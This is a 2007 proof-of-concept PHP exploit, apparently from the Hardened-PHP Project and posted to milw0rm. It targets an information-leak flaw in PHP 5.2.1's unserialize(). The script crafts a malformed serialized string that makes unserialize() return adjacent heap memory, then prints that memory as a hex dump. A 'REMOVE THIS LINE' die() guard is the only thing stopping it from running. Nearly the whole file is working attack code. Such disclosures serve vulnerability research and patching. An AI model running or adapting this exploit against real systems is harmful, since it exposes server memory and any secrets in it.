<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //       PHP 5.2.1 unserialize() Information Leak Vulnerability       //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");
  
  
  
  
  $str = 'S:'.(100*3).':"'.str_repeat('\61', 100).'"';
  $arr = array(str_repeat('"', 200)."1"=>1,str_repeat('"', 200)."2"=>1);

  $heapdump = unserialize($str);
  
  
  
  
  echo "Heapdump\n---------\n\n";
  
  $len = strlen($heapdump);
  for ($b=0; $b<$len; $b+=16) {
    printf("%08x: ", $b);
    for ($i=0; $i<16; $i++) {
      if ($b+$i<$len) {
          printf ("%02x ", ord($heapdump[$b+$i]));
      } else {
          printf (".. ");
      }
    }
    for ($i=0; $i<16; $i++) {
      if ($b+$i<$len) {
          $c = ord($heapdump[$b+$i]);
      } else {
          $c = 0;
      }
      if ($c > 127 || $c < 32) {
        $c = ord(".");
      }
      printf ("%c", $c);
    }
    printf("\n");
  }
?>

# milw0rm.com [2007-03-23]
